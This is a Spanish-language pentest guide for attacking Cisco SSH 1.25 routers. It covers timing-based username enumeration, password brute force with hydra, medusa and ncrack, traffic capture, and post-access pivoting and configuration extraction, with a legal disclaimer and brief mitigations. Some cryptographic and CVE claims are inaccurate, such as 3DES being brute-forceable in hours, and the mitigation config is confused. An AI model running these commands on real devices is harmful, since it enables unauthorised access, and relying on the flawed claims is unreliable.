
### Cisco SSH 1.25 — Auditoría Ofensiva y Técnicas de Explotación

#### 1. Introducción: Cisco SSH 1.25 

**Cisco SSH 1.25** es una versión extremadamente antigua del demonio SSH, datada en el período 1998-2001. A diferencia de OpenSSH (que sí es software de código abierto parcheado regularmente), Cisco SSH 1.25 presenta vulnerabilidades inherentes al protocolo SSH v1 y a su implementación cerrada.

### Características definitorias

| Aspecto | Descripción |
|--------|-----------|
| **Versión SSH** | SSH Protocol v1 (obsoleto desde 2006) |
| **Protocolo de autenticación** | Principalmente password auth (password1 en SSH1) |
| **Cifrado** | DES, 3DES débiles, sin soporte moderno (AES, ChaCha20) |
| **Validación de usuario** | Sin delay anti-timing; respuestas diferenciables |
| **Patching** | Cerrado, sin actualizaciones de seguridad desde años |

---

### 2. Vulnerabilidades Específicas de Cisco SSH 1.25

### 2.1 — Timing Attack / Timing Analysis (CVSS 5.3)

**Descripción:** Cisco SSH 1.25 responde de manera diferente según si el usuario es válido o no:

- **Usuario NO válido:** El servidor responde inmediatamente con "User not found" → ~50-100 ms
- **Usuario VÁLIDO pero contraseña inválida:** El servidor verifica credenciales → ~300-500+ ms

**Impacto:** Un atacante puede enumerar usuarios sin credenciales válidas midiendo tiempos.

```
┌─────────────────────────────┐
│ Test: Usuario "root"        │
├─────────────────────────────┤
│ Timing: 450ms               │
│ Conclusión: USUARIO VÁLIDO  │
└─────────────────────────────┘

┌─────────────────────────────┐
│ Test: Usuario "xyz99999"    │
├─────────────────────────────┤
│ Timing: 75ms                │
│ Conclusión: NO EXISTE       │
└─────────────────────────────┘
```

**Umbral típico:** >300 ms = Usuario válido (con tolerancia para latencia de red)

**CVE relacionado:** No asignado específicamente, pero similar a CVE-2015-6564 y el principio de CVE-2018-15473 (OpenSSH)

---

### 2.2 — Error Message Differential Analysis

**Descripción:** Los mensajes de error SSH son distinguibles:

```bash
# Usuario INVÁLIDO (respuesta rápida)
$ ssh invalid_user_xyz@router
ssh: invalid_user_xyz@router: User not found
# O simplemente: SSH-1.0 protocol error

# Usuario VÁLIDO, contraseña INVÁLIDA (respuesta lenta)
$ ssh admin@router
admin@router's password: [pausa]
Permission denied (password)
# O: authentication failure
```

**Análisis en Python/Bash:** Capturar el stderr/stdout permite distinguir tipos de error.

---

### 2.3 — Weak Cipher Suites (SSH Protocol v1 Legacy)

**Descripción:** SSH v1 en Cisco SSH 1.25 soporta solo:

- **Triple DES (3DES-CBC)** — 168 bits nominales, pero débil por diseño SSH v1
- **DES** — 56 bits, completamente comprometido
- **No hay soporte para:** AES, ChaCha20, criptografía moderna

**Explotación:**
```bash
# Fuerza bruta de claves de sesión 3DES
# Con GPU moderna: ~2^56 intentos = minutos/horas
# DEcracking disponible públicamente en repositorios de pentesting
```

---

### 2.4 — Weak Password Authentication (Protocol SSH v1)

**Descripción:** SSH v1 transmite la contraseña de forma encriptada pero con debilidades:

1. **Sesión SSH v1 solo cifra con clave de sesión débil**
2. **No hay Perfect Forward Secrecy**
3. **Posibilidad de ataque MITM si no se verifica host key correctamente**

**Explotación en pentest:**
- Fuerza bruta agresiva de contraseñas (sin rate limiting en Cisco SSH 1.25)
- Reutilización de sesiones
- Ataque de repetición si se captura tráfico

---

### 2.5 — Lack of Rate Limiting y Account Lockout (Common in Legacy Cisco)

**Descripción:** Cisco SSH 1.25 a menudo NO implementa:

- Delay tras fallos de autenticación
- Bloqueo de cuenta tras N intentos
- Rate limiting de intentos SSH por IP

**Impacto:** Fuerza bruta sin restricciones es posible.

```bash
# Ejemplo: 10,000 intentos contra "admin" en minutos
hydra -l admin -P rockyou.txt ssh://192.168.1.1 -t 16 -f
# En Cisco SSH 1.25 antiguo: SIN protección contra esto
```

---

## 3. Técnicas de Auditoría Ofensiva

### 3.1 — Enumeración de Usuarios vía Timing Analysis

**Herramienta:** `ssh-username-enum-cisco.py`

**Mecanismo:**

```python
# Pseudocódigo
for username in wordlist:
    start = now()
    connect_and_try_auth(username, wrong_password)
    elapsed = now() - start
    
    if elapsed > 300ms:
        print(f"[+] {username} FOUND")  # Usuario válido
    else:
        print(f"[-] {username} not found")  # Usuario no existe
```

**Ejemplo real:**

```bash
python3 ssh-username-enum-cisco.py 192.168.1.1 -p 22 \
    -w /usr/share/wordlists/users.txt --verbose
```

**Salida esperada:**

```
[*] Objetivo: 192.168.1.1:22

[*] Detectando versión SSH...
[+] Banner: SSH-1.99-Cisco SSH 1.25
[+] Detectado: Cisco SSH 1.25
[*] Estado: Cisco SSH 1.25 es antiguo, vulnerable a timing attacks

[*] Enumerando 50 usuarios

[*] Resultados:
--------------------------------------------------
[+] admin ENCONTRADO (450ms)
[+] root ENCONTRADO (420ms)
[+] cisco ENCONTRADO (380ms)
[-] nobody no encontrado (75ms)
[-] guest no encontrado (60ms)

[+] Usuarios encontrados (3):
    ✓ admin
    ✓ root
    ✓ cisco
```

---

### 3.2 — Enumeración via Error Analysis

**Mecanismo:**

```bash
# Capturar respuesta SSH y analizar mensaje de error
$ timeout 2 ssh admin@router 2>&1
# Output: "Permission denied (password)." → Usuario EXISTE

$ timeout 2 ssh nonexistent@router 2>&1
# Output: "User not found" → Usuario NO existe
```

**Script bash:** Ver `cisco-ssh-enum.sh` → función `analyze_ssh_error()`

---

### 3.3 — Fuerza Bruta de Contraseñas

**Condiciones favorables en Cisco SSH 1.25:**

- ✓ Sin lockout de cuenta
- ✓ Sin rate limiting agresivo
- ✓ Protocolo SSH v1 débil (desciframiento posible con GPU)
- ✗ Límite: tiempo de ataque (días/semanas para diccionarios grandes)

**Herramientas recomendadas:**

```bash
# Hydra con paralelismo agresivo
hydra -L usuarios_encontrados.txt \
      -P /usr/share/wordlists/rockyou.txt \
      ssh://192.168.1.1 \
      -t 16 -f -m 0

# Medusa
medusa -h 192.168.1.1 -U usuarios_encontrados.txt \
       -P rockyou.txt -M ssh -n 22 -e ns

# Ncrack
ncrack -p 22 --user admin -P rockyou.txt 192.168.1.1
```

---

### 3.4 — Ataque de Desciframiento Post-Captura (Advanced)

**Contexto:** Si se captura tráfico SSH v1 en red, el tráfico está cifrado con 3DES/DES.

**Explotación con herramientas especializada:**

```bash
# 1. Capturar tráfico SSH v1
tcpdump -i eth0 -w ssh_traffic.pcap 'tcp port 22'

# 2. Extraer datos cifrados
# (Requiere herramientas especializadas de auditoría SSH v1)

# 3. Ataque offline de fuerza bruta en clave de sesión SSH v1
# (Tiempo: horas con GPU, 3DES es débil)
```

**Nota:** Técnica avanzada, fuera del scope de este documento.

---

### 4. Plan de Auditoría: Fase a Fase

### Fase 1: Reconocimiento (5 minutos)

```bash
# 1. Banner grabbing
nc -nv 192.168.1.1 22
# Output: SSH-1.99-Cisco SSH 1.25

# 2. Escaneo de puertos alternativos SSH
nmap -p 22,2222,2200 192.168.1.1

# 3. Documentar: servidor Cisco SSH 1.25 antiguo en producción
```

### Fase 2: Enumeración de Usuarios (10-30 minutos)

```bash
# Con Python (preciso, múltiples técnicas)
python3 ssh-username-enum-cisco.py 192.168.1.1 \
    -w /usr/share/wordlists/metasploit/unix_users.txt

# O con Bash (simple, directo)
bash cisco-ssh-enum.sh 192.168.1.1 22 usuarios.txt
```

**Resultado esperado:** Lista de usuarios válidos (admin, root, cisco, netadmin, etc.)

### Fase 3: Fuerza Bruta de Contraseñas (30 min - horas)

```bash
# Usando usuarios enumerados
hydra -L usuarios_validos.txt -P passwords.txt \
      ssh://192.168.1.1 -t 8 -f

# Si se encuentran credenciales:
ssh admin@192.168.1.1
# → Acceso al router Cisco (shell, configuración, pivoting)
```

### Fase 4: Post-Explotación

```bash
# Túnel SSH para acceso a red interna
ssh -D 9050 admin@192.168.1.1
# → Usar proxychains para pivoting

# Extraer configuración (credenciales, routing, ACLs)
show running-config
show users
show ip route

# Escalar a otros dispositivos Cisco en la red
```

---

### 5. Herramientas Suministradas

### 5.1 — ssh-username-enum-cisco.py

**Características:**

- ✓ Detección automática de Cisco SSH vs OpenSSH
- ✓ CVE-2018-15473 monkey patch para OpenSSH <= 7.7
- ✓ Timing analysis para Cisco SSH 1.25
- ✓ Error analysis (parsing de mensajes SSH)
- ✓ Compatibilidad con wordlists estándar
- ✓ Salida clara (usuarios encontrados resaltados)

**Requisitos:**

```bash
pip install paramiko --break-system-packages
```

**Uso:**

```bash
# Usuario único (test)
python3 ssh-username-enum-cisco.py 192.168.1.1 -u admin

# Wordlist
python3 ssh-username-enum-cisco.py 192.168.1.1 \
    -w /usr/share/wordlists/users.txt

# Verbose (mostrar intentos fallidos)
python3 ssh-username-enum-cisco.py 192.168.1.1 \
    -w usuarios.txt -v
```

---

### 5.2 — cisco-ssh-enum.sh

**Características:**

- ✓ Banner grabbing (detección Cisco SSH)
- ✓ Timing analysis puro (sin dependencias Python)
- ✓ Error differential analysis
- ✓ Paralelismo con control de threads
- ✓ Captura y análisis de resultados

**Requisitos:**

```bash
# Minimal: netcat, ssh, sshpass, timeout
apt-get install openssh-client sshpass  # En Kali Linux ya está

# Opcional: parallel (para mejor performance)
apt-get install parallel
```

**Uso:**

```bash
chmod +x cisco-ssh-enum.sh

# Básico
./cisco-ssh-enum.sh 192.168.1.1 22 usuarios.txt

# Con más threads
./cisco-ssh-enum.sh 192.168.1.1 22 usuarios.txt -t 8

# Umbrales timing personalizados (ms)
./cisco-ssh-enum.sh 192.168.1.1 22 usuarios.txt -T 400
```

---

### 6. Estimación de Éxito

| Escenario | Probabilidad | Tiempo |
|-----------|-------------|--------|
| Enumerar usuarios válidos | **95%** | 10-30 min |
| Encontrar contraseña débil (admin/cisco/router) | **60-80%** | 10 min |
| Acceso al router completo | **60-70%** (si hay usuario débil) | 1-2 horas |
| Extraer configuración/credenciales | **80%** (post-acceso) | 5 min |

---

### 7. Limitaciones y Consideraciones

### 7.1 — Factores que pueden afectar

**Negativos (reduce éxito):**

- ✗ Latencia de red muy alta (confunde timing analysis)
- ✗ Router con rate limiting NO estándar implementado
- ✗ Firewall bloqueando intentos repetidos
- ✗ IDS/IPS detectando enumeración SSH

**Positivos (aumenta éxito):**

- ✓ Acceso a red local (menos latencia)
- ✓ Wordlists específicas del entorno (admin, cisco, router, etc.)
- ✓ Información previa sobre usuarios (OSINT)

### 7.2 — Defensa / Mitigación

Para defensores (Blue Team):

```bash
# 1. Actualizar Cisco SSH a versión moderna
#    (si el hardware lo permite)

# 2. Implementar rate limiting en sshd_config
Protocol 1  # DESHABILITAR
Protocol 2  # Usar solo SSH v2
MaxAuthTries 2
MaxSessions 1

# 3. Monitoreo de intentos fallidos
cat /var/log/auth.log | grep "Failed password"

# 4. Firewall (iptables) contra brute force
# Rate limit SSH a 3 conexiones por minuto por IP
iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min \
         -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP
```

---

### 8. Legales y Éticas

⚠️ **ADVERTENCIA LEGAL:**

```
La enumeración de usuarios SSH es una técnica ofensiva que SOLO debe 
usarse en:

✓ Sistemas propios
✓ Entornos autorizados (con permiso escrito del propietario)
✓ Pruebas de penetración legales

ESTÁ PROHIBIDO:

✗ Acceso no autorizado a sistemas ajenos
✗ Enumeración sin consentimiento
✗ Explotación de vulnerabilidades en producción

Responsabilidad: El autor no se responsabiliza del uso indebido.

Código Penal Español:
Art. 197 — Acceso sin consentimiento
Art. 198 — Revelación de datos e información
```

---

## 9. Referencias y Recursos

### CVEs Relacionados

- **CVE-2018-15473** — OpenSSH Username Enumeration
- **CVE-2015-6564** — SSH Protocol v1 Weaknesses
- **CVE-2023-51767** — Terrapin Attack (ChaCha20-Poly1305)

### Repositorio

- GitHub: https://github.com/hackingyseguridad/ssha/
- Web: https://hackingyseguridad.com/

### Wordlists Recomendadas

```bash
# En Kali Linux:
/usr/share/wordlists/metasploit/unix_users.txt
/usr/share/wordlists/metasploit/common_users.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt (si está instalado)

# Descargar:
# GitHub: danielmiessler/SecLists
```

### Herramientas Complementarias

```bash
# Banner grabbing avanzado
ssh-audit <IP>          # Auditoría SSL/SSH

# Escaneo NSE
nmap -p 22 --script ssh2-enum-algos <IP>

# Fuzzing
hydra                   # Brute force de credenciales
medusa                  # Alternativa a Hydra
ncrack                  # Otro fuzzer SSH
```

---

### 10. Conclusión

**Cisco SSH 1.25 es extremadamente vulnerable** por razones inherentes:

1. Protocolo SSH v1 anticuado (obsoleto desde 2006)
2. Timing analysis trivial: usuarios válidos tardan más
3. Error messages diferenciables
4. Cifrado débil (3DES/DES)
5. Sin rate limiting ni account lockout

**La enumeración de usuarios es el primer paso** para obtener acceso a routers/switches Cisco en redes empresariales. Esto hace que **actualizar SSH sea CRÍTICO** en cualquier auditoría de seguridad.

---
title: "Cisco SSH 1.25 — Auditoría Ofensiva y Enumeración de Usuarios"
author: "@antonio_taboada"
date: 2024
license: "GPL-3.0"
categories:
  - ssh
  - pentesting
  - cisco
  - enumeration
  - vulnerability-analysis
---

#
http://www.hackingyseguridad.com/
#
